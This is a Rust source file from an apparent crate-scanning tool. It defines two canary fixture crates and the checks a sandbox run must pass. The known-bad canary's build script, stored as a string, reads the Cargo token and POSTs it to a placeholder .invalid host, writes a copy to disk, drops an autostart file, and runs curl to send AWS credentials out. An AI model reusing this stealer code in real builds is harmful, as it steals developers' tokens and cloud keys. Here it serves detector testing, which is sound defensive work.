//! Canaries: two inert fixture crates with known behavior (ADR 0020).
//!
//! The known bad canary's build script does what a stealer does: it reads
//! the cargo token and posts it over HTTP, copies it into its build output,
//! drops an autostart file, tries IPv6, and has `curl` post the AWS
//! credentials over HTTPS. Every one of these must be caught. The known good
//! canary has a build script that only prints a cargo instruction; nothing
//! may be flagged. If either expectation fails, verdicts cannot be trusted
//! and the supervisor pauses the stages that produce them.
//!
//! Their sources exist only as strings here. They are packed into the blob
//! store and vendored into a payload like any crate, and compiled and run
//! **only inside a microVM** (docs/TESTING.md). The orchestrator runs them
//! on a schedule and after every warm build; `cargo xtask canary` runs them
//! as a test.

use crateward_core::blobs::BlobStore;
use crateward_core::job::BuildOutcome;
use crateward_core::name::CrateName;

use crate::payload::{Package, PayloadSpec};
use crate::trace::Role;
use crate::worker::RunReport;

/// A fixture crate and what its run must show.
#[derive(Debug, Clone, Copy)]
pub struct Canary {
    /// Name used for records; also the crate name.
    pub name: &'static str,
    manifest: &'static str,
    build_rs: &'static str,
    check: fn(&RunReport) -> Vec<String>,
}

const VERSION: &str = "0.1.0";

/// The host the known bad canary posts to.
pub const EXFIL_HOST: &str = "exfil.crateward-canary.invalid";

/// Runs only in the microVM. Steals, copies, persists and phones home.
const BAD_BUILD_RS: &str = r#"use std::io::{Read, Write};
fn main() {
    let home = std::env::var("HOME").unwrap_or_default();
    let mut token = String::new();
    if let Ok(mut file) = std::fs::File::open(format!("{home}/.cargo/credentials.toml")) {
        let _ = file.read_to_string(&mut token);
    }
    if let Ok(mut stream) = std::net::TcpStream::connect("exfil.crateward-canary.invalid:80") {
        let _ = write!(
            stream,
            "POST /collect HTTP/1.1\r\nHost: exfil.crateward-canary.invalid\r\nContent-Length: {}\r\n\r\n{}",
            token.len(),
            token
        );
        let mut reply = Vec::new();
        let _ = stream.read_to_end(&mut reply);
    }
    // Persistence and a copy of the loot on the scratch disk.
    if let Ok(out) = std::env::var("OUT_DIR") {
        let _ = std::fs::write(format!("{out}/stolen.txt"), &token);
    }
    let autostart = format!("{home}/.config/autostart");
    if std::fs::create_dir_all(&autostart).is_ok() {
        let _ = std::fs::write(format!("{autostart}/canary.desktop"), "[Desktop Entry]\n");
    }
    // No IPv6 route in the guest: the attempt fails there, and the trace
    // must still show it.
    if let Ok(target) = "[2001:db8::7]:443".parse() {
        let _ = std::net::TcpStream::connect_timeout(&target, std::time::Duration::from_secs(2));
    }
    let _ = std::process::Command::new("curl")
        .args(["-s", "-m", "10", "-X", "POST", "--data-binary"])
        .arg(format!("@{home}/.aws/credentials"))
        .arg("https://tls.crateward-canary.invalid/collect")
        .status();
}
"#;

/// Runs only in the microVM. Does what an ordinary build script does.
const GOOD_BUILD_RS: &str = "fn main() {\n    println!(\"cargo:rerun-if-changed=build.rs\");\n}\n";

/// The canary that must be caught.
pub const KNOWN_BAD: Canary = Canary {
    name: "canary-exfil",
    manifest: "[package]\nname = \"canary-exfil\"\nversion = \"0.1.0\"\nedition = \"2021\"\nbuild = \"build.rs\"\n",
    build_rs: BAD_BUILD_RS,
    check: check_known_bad,
};

/// The canary that must come out clean.
pub const KNOWN_GOOD: Canary = Canary {
    name: "canary-inert",
    manifest: "[package]\nname = \"canary-inert\"\nversion = \"0.1.0\"\nedition = \"2021\"\nbuild = \"build.rs\"\n",
    build_rs: GOOD_BUILD_RS,
    check: check_known_good,
};

/// Both canaries.
pub const ALL: [Canary; 2] = [KNOWN_BAD, KNOWN_GOOD];

impl Canary {
    fn tar(&self) -> Result<Vec<u8>, String> {
        let mut builder = tar::Builder::new(Vec::new());
        for (path, data) in [
            ("Cargo.toml", self.manifest),
            ("build.rs", self.build_rs),
            ("src/lib.rs", ""),
        ] {
            let mut header = tar::Header::new_gnu();
            header.set_size(data.len() as u64);
            header.set_mode(0o644);
            header.set_cksum();
            builder
                .append_data(
                    &mut header,
                    format!("{}-{VERSION}/{path}", self.name),
                    data.as_bytes(),
                )
                .map_err(|e| e.to_string())?;
        }
        builder.into_inner().map_err(|e| e.to_string())
    }

    /// Stores the fixture and returns the payload of a job for it.
    ///
    /// # Errors
    ///
    /// Fails if the blob store cannot store it.
    pub fn payload(&self, blobs: &BlobStore) -> Result<PayloadSpec, String> {
        let blob = blobs.put(&self.tar()?).map_err(|e| e.to_string())?;
        // Any 64 hex digits do: the lockfile and the vendored checksum file
        // only have to agree.
        let checksum = blob.blake3.clone();
        let lockfile = format!(
            "version = 4\n\n\
             [[package]]\nname = \"{name}\"\nversion = \"{VERSION}\"\n\
             source = \"registry+https://github.com/rust-lang/crates.io-index\"\n\
             checksum = \"{checksum}\"\n\n\
             [[package]]\nname = \"crateward-probe\"\nversion = \"0.0.0\"\n\
             dependencies = [\n \"{name}\",\n]\n",
            name = self.name
        );
        Ok(PayloadSpec {
            name: CrateName::parse(self.name).map_err(|e| e.to_string())?,
            version: semver::Version::new(0, 1, 0),
            lockfile,
            packages: vec![Package {
                name: self.name.into(),
                version: VERSION.into(),
                checksum,
                blake3: blob.blake3,
            }],
            extra_probes: Vec::new(),
            files: Vec::new(),
            stubs: Vec::new(),
        })
    }

    /// What the run failed to show; empty when the canary passed.
    #[must_use]
    pub fn check(&self, report: &RunReport) -> Vec<String> {
        (self.check)(report)
    }
}

fn expect(problems: &mut Vec<String>, ok: bool, what: &str) {
    if !ok {
        problems.push(what.to_owned());
    }
}

fn check_known_bad(report: &RunReport) -> Vec<String> {
    let mut p = Vec::new();
    expect(
        &mut p,
        report.outcome == BuildOutcome::Succeeded,
        "the build did not succeed",
    );
    expect(
        &mut p,
        report.network.dns.iter().any(|n| n == EXFIL_HOST),
        "the lookup was not logged",
    );
    let leaked =
        |kind: &str, via: &str| report.leaked.iter().any(|l| l.kind == kind && l.via == via);
    expect(
        &mut p,
        leaked("cargo_registry_token", &format!("http://{EXFIL_HOST}")),
        "the token sent over HTTP was not found",
    );
    expect(
        &mut p,
        leaked("aws_access_key_id", "https://tls.crateward-canary.invalid"),
        "the key sent over HTTPS was not found",
    );
    let trace = &report.trace;
    expect(&mut p, trace.complete, "the trace did not end");
    let script = trace
        .processes
        .iter()
        .find(|x| x.role == Role::BuildScript && x.exe.contains(KNOWN_BAD.name));
    let opened = |pid: u32, file: &str| {
        trace
            .sensitive_opens
            .iter()
            .any(|f| f.pid == pid && f.path.ends_with(file))
    };
    match script {
        None => p.push("the build script is not in the trace".into()),
        Some(script) => {
            expect(
                &mut p,
                opened(script.pid, "/.cargo/credentials.toml"),
                "the credentials read is not in the trace",
            );
            expect(
                &mut p,
                trace.sockets.iter().any(|s| {
                    s.pid == script.pid && s.how == "connect" && s.address.ends_with(":80")
                }),
                "the connect is not in the trace",
            );
            expect(
                &mut p,
                trace
                    .sockets
                    .iter()
                    .any(|s| s.pid == script.pid && s.address == "[2001:db8::7]:443"),
                "the IPv6 attempt is not in the trace",
            );
            let curl = trace
                .processes
                .iter()
                .find(|x| x.ppid == Some(script.pid) && x.exe.ends_with("/curl"));
            expect(
                &mut p,
                curl.is_some_and(|c| opened(c.pid, "/.aws/credentials")),
                "curl reading the AWS file is not in the trace",
            );
        }
    }
    expect(
        &mut p,
        report
            .tokens_on_disk
            .iter()
            .any(|l| l.kind == "cargo_registry_token" && l.via.ends_with("/stolen.txt")),
        "the copied token was not found on disk",
    );
    expect(
        &mut p,
        report.scratch.as_ref().is_some_and(|s| {
            s.outside_build
                .iter()
                .any(|e| e.path == "/work/home/.config/autostart/canary.desktop")
        }),
        "the autostart file was not found on disk",
    );
    p
}

fn check_known_good(report: &RunReport) -> Vec<String> {
    let mut p = Vec::new();
    expect(
        &mut p,
        report.outcome == BuildOutcome::Succeeded,
        "the build did not succeed",
    );
    expect(&mut p, report.trace.complete, "the trace did not end");
    expect(
        &mut p,
        report.leaked.is_empty()
            && report.tokens_in_trace.is_empty()
            && report.tokens_on_disk.is_empty(),
        "a honeytoken was flagged",
    );
    let t = &report.trace;
    expect(
        &mut p,
        t.sensitive_opens.is_empty() && t.writes_outside_work.is_empty(),
        "a file access was flagged",
    );
    expect(&mut p, t.sockets.is_empty(), "a socket was flagged");
    expect(&mut p, t.tamper.is_empty(), "a tamper attempt was flagged");
    let n = &report.network;
    expect(
        &mut p,
        n.dns.is_empty() && n.connections.is_empty() && n.packets.is_empty(),
        "network traffic was flagged",
    );
    expect(
        &mut p,
        report.scratch.as_ref().is_some_and(|s| {
            s.error.is_none()
                && s.outside_build.is_empty()
                && s.executables_outside_target.is_empty()
                && s.planted_changed.is_empty()
        }),
        "the scratch disk was flagged",
    );
    p
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn fixtures_pack_and_name_themselves() {
        for canary in ALL {
            let tar = canary.tar().unwrap();
            let mut archive = tar::Archive::new(tar.as_slice());
            let names: Vec<String> = archive
                .entries()
                .unwrap()
                .map(|e| e.unwrap().path().unwrap().to_string_lossy().into_owned())
                .collect();
            assert!(names.contains(&format!("{}-0.1.0/build.rs", canary.name)));
            assert!(canary.manifest.contains(canary.name));
        }
    }
}
